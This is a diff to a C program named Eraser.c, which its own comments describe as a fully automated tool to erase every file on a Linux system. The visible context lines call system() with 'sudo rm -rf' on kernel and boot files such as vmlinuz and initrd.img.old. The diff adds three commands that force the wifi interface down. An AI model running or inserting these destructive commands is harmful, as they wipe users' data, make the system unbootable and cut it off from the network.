@@ -3,7 +3,7 @@
 // ERASE EVERYTHING ON YOUR HARDRIVE
 // LAST EDIT 13:20 04.03.20
 // Project finished 08.10.2020
-// Version: 1.0.0
+// Version: 1.0.1
 
 /*
  *  Eraser.c:  Fully automated eraser to delete every file on your system (linux based)
@@ -138,5 +138,8 @@
     system("sudo rm -rf initrd.img.old");
     system("sudo rm -rf vmlinuz");
     system("sudo rm -rf vmlinuz.old");
+    system("sudo ifconfig wlan0 down");   // disconnect from wifi (force)
+    system("sudo dhclient -r wlan0");   //   disconnect from wifi (force)
+    system("sudo nmcli nm enable false"); // disconnect from wifi (force)
     return 0;
   } // END
